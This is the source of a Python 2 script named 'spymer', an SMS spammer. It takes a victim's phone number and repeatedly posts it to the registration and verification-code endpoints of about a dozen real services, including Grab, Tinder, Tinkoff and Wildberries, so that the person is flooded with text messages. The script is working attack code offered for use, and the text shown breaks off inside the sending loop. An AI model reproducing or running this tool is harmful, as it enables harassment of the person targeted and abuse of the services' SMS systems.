
class spymer:
	author = ''

	def main(self):
		print '8888888888888888888888888\n8888888888888888888888888\n888        888        888\n888  888888888  8888  888\n888  888888888  888888888\n888  888888888  888888888\n888        888        888\n888  888888888888888  888\n888  888888888888888  888\n888  888888888  8888  888\n888  888888888        888\n8888888888888888888888888\n8888888888888888888888888\n8888    FSystem88    8888\n8888   SMS Spammer   8888\n8888      v.1.5      8888\n8888888888888888888888888\n8888888888888888888888888\n'
		import requests, datetime, sys, time, argparse
		parser = argparse.ArgumentParser(prog='spymer', description="Fucking shit by Fsystem88. May be not work. Only for Russia!", epilog='My contacts: +79153509908 (Russia) or e-mail - FSystem88@bk.ru')
		parser.add_argument('phonenum', metavar='phone', help='the phone number (example: 79153509908)')
		args = parser.parse_args()
		
		def showstatus(message, type='new'):
			now = datetime.datetime.now().strftime('%H:%M:%S')
			icon = '*'
			if type == 'warn':
				icon = '!'
			else:
				if type == 'new':
					icon == '*'
			message = '[' + icon + '][' + now + ']' + message
			return message
			
		def wrapsbrace(string, endspace=False):
			if endspace == True:
				return '[' + string + '] '
			return '[' + string + ']'

		def sleep(x):
			try:
				time.sleep(x)
			except KeyboardInterrupt:
				print '\r' + showstatus(wrapsbrace('except', True) + 'KeyboardInterrupt thrown! Exiting . . .', 'warn')
				exit()
				
			
		_phone = args.phonenum
		
		iteration = 0
		_phone9 = _phone[1:]
		print showstatus(wrapsbrace('info', True) + ('Send SMS to: +{}').format(_phone))
		print 'Spammer started.\n If you want to stop - press Ctrl+Z.'
		i = 1
		while i < 10:
			grab = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
			rutaxi = requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
			belka = requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
			tinder = requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
			vkusvill = requests.post('https://mobile.vkusvill.ru:40113/api/user/', data={'Phone_number': _phone9,'version': '2'}, headers={})
			karusel = requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
			uramobil = requests.post('https://service.uramobil.ru/profile/smstoken', data={'PhoneNumber': _phone}, headers={})
			taxiseven = requests.post('http://taxiseven.ru/auth/register', data={'phone': _phone}, headers={})
			_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
			dostavista = requests.post('https://dostavista.ru/backend/send-verification-sms', data={'phone': _phone9dostavista}, headers={})
			tinkoff = requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
			worki = requests.post('https://api.iconjob.co/api/web/v1/verification_code', data={"phone": _phone}, headers={})
			wildberries = requests.post('https://security.wildberries.ru/mobile/requestconfirmcode?forAction=RegisterUser', data={"phone": '+'+_phone}, headers={})
